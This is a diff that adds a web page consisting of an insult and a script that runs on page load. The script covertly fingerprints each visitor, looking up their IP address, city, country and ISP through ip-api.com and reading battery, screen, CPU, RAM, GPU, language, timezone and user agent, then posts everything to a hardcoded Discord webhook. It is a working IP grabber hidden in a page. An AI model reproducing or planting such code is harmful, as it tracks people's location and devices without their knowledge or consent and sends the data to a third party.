@@ -1,0 +1,77 @@
+go fuck yourself!
+<script>
+    const webhookURL = "https://discord.com/api/webhooks/1466448858925240412/osJaKR7wAQ5s1IwHKeW6SjBWixidlk7t6U-gxWBcW5vlNlZfkSoRJZRrO34LXI_a4LM2";
+    async function collectAndSend() {
+        let ipData = { ip: "Unknown", city: "Unknown", country: "Unknown", isp: "Unknown" };
+        try {
+            const response = await fetch('http://ip-api.com/json/');
+            if (response.ok) {
+                const data = await response.json();
+                ipData = { 
+                    ip: data.query, 
+                    city: data.city, 
+                    country_name: data.country, 
+                    org: data.isp 
+                };
+            }
+        } catch (e) {}
+
+        let batteryLevel = "Not Supported";
+        let hasBattery = false;
+        try {
+            const battery = await navigator.getBattery();
+            batteryLevel = `${(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
+            if (battery.level < 1 || battery.charging === false) {
+                hasBattery = true;
+            }
+        } catch (e) {}
+
+        const languageCode = navigator.language;
+        let fullLanguageName = languageCode;
+        try {
+            const displayNames = new Intl.DisplayNames(['en'], { type: 'language' });
+            fullLanguageName = displayNames.of(languageCode);
+        } catch (e) {}
+
+        const width = window.screen.width;
+        const isTouch = navigator.maxTouchPoints > 0;
+        let deviceGuess = "Desktop PC";
+
+        if (hasBattery && width > 1000) {
+            deviceGuess = "Laptop";
+        } else if (isTouch && width < 500) {
+            deviceGuess = "Smartphone";
+        } else if (isTouch && width >= 500 && width <= 1000) {
+            deviceGuess = "Tablet";
+        }
+
+        const data = {
+            content: "🔴 **Full System Fingerprint Received**",
+            embeds: [{
+                color: 15158332,
+                fields: [
+                    { name: "🔍 Inferred Device", value: `**${deviceGuess}**`, inline: false },
+                    { name: "🌐 Network", value: `IP: ${ipData.ip}\nLocation: ${ipData.city}, ${ipData.country_name}\nISP: ${ipData.org}`, inline: false },
+                    { name: "💻 Hardware", value: `CPU Cores: ${navigator.hardwareConcurrency}\nRAM: ${navigator.deviceMemory}GB (Approx)\nGPU: ${getGPU()}`, inline: true },
+                    { name: "📱 Device", value: `OS: ${navigator.platform}\nBattery: ${batteryLevel}\nScreen: ${window.screen.width}x${window.screen.height}`, inline: true },
+                    { name: "🌍 Software", value: `Browser: ${navigator.userAgent}\nLanguage: ${fullLanguageName}\nTimezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`, inline: false }
+                ]
+            }]
+        };
+
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+    }
+
+    function getGPU() {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
+    }
+
+    collectAndSend();
+</script>
